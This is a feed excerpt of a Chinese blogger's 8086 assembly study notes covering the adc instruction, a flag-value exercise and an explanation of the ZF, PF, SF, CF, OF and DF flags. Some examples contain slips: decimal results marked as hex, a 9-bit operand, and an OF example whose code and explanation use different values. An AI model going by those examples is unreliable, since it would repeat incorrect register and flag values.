    <content type="html"><![CDATA[<p>adc是带进位加法指令<br>指令格式：adc 操作对象1，操作对象2<br>功能：操作对象1=操作对象1+操作对象2+CF</p><p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，（ax）=4,abc执行时想，相当于计算：（ax）+1+CF=2+1+1=4<br>adc指令的目的，就是来进行假发的第二步运算的。adc指令和add指令相配合就可以对更大的数据进行加法运算。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;adc是带进位加法指令&lt;br&gt;指令格式：adc 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1+操作对象2+CF&lt;/p&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点11.1 </title>
    <link href="https://nocbtm.github.io/2018/09/16/%E6%A3%80%E6%B5%8B%E7%82%B911-1/"/>
    <id>https://nocbtm.github.io/2018/09/16/检测点11-1/</id>
    <published>2018-09-16T06:29:30.000Z</published>
    <updated>2019-10-01T08:26:29.457Z</updated>
    
    <content type="html"><![CDATA[<p>写出下面每条指令执行后，ZF、PF、SF、等标志位的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub al,al     al=0h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mov al,1      al=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">push ax       ax=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">pop bx        bx=1h        ZF=1        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">add al,bl     al=2h        ZF=0        PF=0        SF=0 </span><br><span class="line"></span><br><span class="line">add al,10     al=12h       ZF=0        PF=1        SF=0 </span><br><span class="line"></span><br><span class="line">mul al        ax=144h      ZF=0        PF=1        SF=0</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;写出下面每条指令执行后，ZF、PF、SF、等标志位的值。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>标志寄存器</title>
    <link href="https://nocbtm.github.io/2018/09/16/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://nocbtm.github.io/2018/09/16/标志寄存器/</id>
    <published>2018-09-16T03:55:49.000Z</published>
    <updated>2019-10-01T08:38:09.006Z</updated>
    
    <content type="html"><![CDATA[<p>标志寄存器（简称flag）的作用：<br>（1）用来存储相关指令的某些执行结果。<br>（2）用来为CPU执行相关指令提供行为依据。<br>（3）用来控制CPU的相关工作方式。<br>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器死按位起作用的，它的每一位都有专门的含义，记录特定的信息。<img alt="" data-src="https://i.imgur.com/p2T0oAQ.png" class="lozad"></p><p>flag的1,3,5,12,13,14,15位在8086CPU中没有使用，不具有任何含义</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>flag的第六位是ZF，零标志位。它记录相关指令执行后，其结果是否为0.如果结果为0，那么zf=1，如果结果不为0，那么zf=0</p><p>例如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，则zf=1</p><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>flag的第二位是PF，奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0<br>比如指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure></p><p>执行后，结果为00001011B，其中有3个1，则pf=0</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>flag的第七位是SF，符号标志位，它记录相关指令后，其结果是否为负。如果结果为负，sf=1，如果不为负，sf=0<br>计算机通常用补码来表示有符号数据。计算机的UI个数据可以看做是由富豪书，也可以看做成无符号数。比如：<br>00000001B，可以看做无符号数1，或有符号数+1；<br>10000001B，可以看做无符号数129，也可以看作有符号数-127<br>不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于我们的程序需要哪一种结果。<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,100000001B</span><br><span class="line">add al,011111111B</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。<br>某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。</p><h2 id="CF标志位"><a href="#CF标志位" class="headerlink" title="CF标志位"></a>CF标志位</h2><p>flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。<br>比如，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值</span><br><span class="line">add al,al执行后：（al）=60H，CF=0</span><br></pre></td></tr></table></figure></p><p>而当两个数据做减法的时候，有可能向更高位借位，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,97H</span><br><span class="line">sub al,98H；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值</span><br><span class="line">sub al,al：执行后（al）=0，CF=0，CF记录了向更高位借位值</span><br></pre></td></tr></table></figure></p><h2 id="OF标志位"><a href="#OF标志位" class="headerlink" title="OF标志位"></a>OF标志位</h2><p>flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.<br>对于无符号数运算，98+99没有进位，CF=0；<br>对于有符号数运算，98+99发生溢出，OF=1<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,F0H</span><br><span class="line">add al,88H</span><br></pre></td></tr></table></figure></p><p>add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；<br>对于有符号数运算，F0H+78H不发生溢出，OF=0</p><h2 id="DF标志位"><a href="#DF标志位" class="headerlink" title="DF标志位"></a>DF标志位</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。<br>df=0 每次操作后si、di递增<br>df=1 每次操作后si、di递减</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标志寄存器（简称flag）的作用：&lt;br&gt;（1）用来存储相关指令的某些执行结果。&lt;br&gt;（2）用来为CPU执行相关指令提供行为依据。&lt;br&gt;（3）用来控制CPU的相关工作方式。&lt;br&gt;flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而fl
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
</feed>
